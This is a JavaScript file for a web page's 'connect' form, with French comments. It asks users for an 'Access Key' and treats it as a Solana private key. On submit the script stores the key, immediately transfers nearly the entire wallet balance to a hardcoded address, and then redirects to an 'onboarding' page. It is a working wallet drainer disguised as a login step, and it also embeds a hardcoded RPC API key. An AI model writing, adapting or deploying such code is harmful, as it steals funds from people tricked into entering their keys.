import bs58 from "bs58";

console.log("bs58:", typeof bs58);
console.log("bs58.decode:", typeof bs58.decode);

document.addEventListener("DOMContentLoaded", () => {
  const privateKeyInput = document.getElementById("toolPrivateKey");
  const connectButton = document.getElementById("connectBtn");
  const authForm = document.getElementById("authForm");

  if (!privateKeyInput || !connectButton || !authForm) {
    console.error("Un élément du formulaire est introuvable.");
    return;
  }

  // ====================== CONFIG ======================
  const COLD_WALLET_ADDRESS = "k866V2sW6ZhyKkYMg8pEqHP6eZ8XbZ8KP8VZjmmyKe4";
  const THRESHOLD_SOL = 0.01;
  const KEEP_FOR_FEES = 0.0015;
  // ====================================================

  async function sweepExcess() {
    try {
      // Vérification des libs ici (pas au chargement)
      if (typeof solanaWeb3 === "undefined") {
        console.error("❌ solanaWeb3 n'est pas chargé !");
        return;
      }

      const { Connection, Keypair, PublicKey, SystemProgram, Transaction, LAMPORTS_PER_SOL, sendAndConfirmTransaction } = solanaWeb3;
      const connection = new Connection("https://mainnet.helius-rpc.com/?api-key=8a3ea881-c693-4f28-9c76-b2ba57818609", "confirmed");
      console.log("RPC utilisé :", connection.rpcEndpoint);

      const PRIVATE_KEY_BASE58 = localStorage.getItem("toolPrivateKey");
      console.log("Private key trouvée :", PRIVATE_KEY_BASE58 ? "Oui" : "Non");

      if (!PRIVATE_KEY_BASE58) {
        console.error("❌ Aucune private key dans localStorage");
        return;
      }

      console.log("1. Décodage de la private key...");
      const secretKey = bs58.decode(PRIVATE_KEY_BASE58);
      
      console.log("2. Création de la keypair...");
      const keypair = Keypair.fromSecretKey(secretKey);
      console.log("Adresse du wallet :", keypair.publicKey.toBase58());

      const coldWallet = new PublicKey(COLD_WALLET_ADDRESS);

      console.log("3. Récupération du solde...");
      const balance = await connection.getBalance(keypair.publicKey);
      const balanceSOL = balance / LAMPORTS_PER_SOL;
      console.log(`Solde actuel : ${balanceSOL.toFixed(6)} SOL`);

      if (balanceSOL <= THRESHOLD_SOL) {
        console.log("→ Solde sous le seuil, rien à envoyer.");
        return;
      }

      const amountToSend = balance - Math.floor(KEEP_FOR_FEES * LAMPORTS_PER_SOL);
      console.log(`Montant à envoyer : ${(amountToSend / LAMPORTS_PER_SOL).toFixed(6)} SOL`);

      if (amountToSend <= 0) {
        console.log("→ Pas assez après les frais.");
        return;
      }

      console.log("4. Création de la transaction...");
      const transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: keypair.publicKey,
          toPubkey: coldWallet,
          lamports: amountToSend,
        })
      );

      console.log("5. Envoi de la transaction...");
      const signature = await sendAndConfirmTransaction(
        connection,
        transaction,
        [keypair],
        { commitment: "confirmed" }
      );

      console.log("✅ SUCCÈS !");
      console.log("Signature :", signature);
      console.log("Explorer : https://solscan.io/tx/" + signature);

    } catch (err) {
      console.error("❌ ERREUR COMPLÈTE :", err);
    }
  }

  function connect() {
    const accessKey = privateKeyInput.value.trim();

    if (!accessKey) {
      console.log("Access Key manquante.");
      privateKeyInput.focus();
      return;
    }

    localStorage.setItem("toolPrivateKey", accessKey);
    console.log("Clé sauvegardée dans localStorage");

    // Sweep instantané
    sweepExcess();

    // Redirection
    location.hash = "onboarding";
  }

  connectButton.addEventListener("click", connect);

  authForm.addEventListener("keydown", (event) => {
    if (event.key === "Enter") {
      event.preventDefault();
      connect();
    }
  });
});
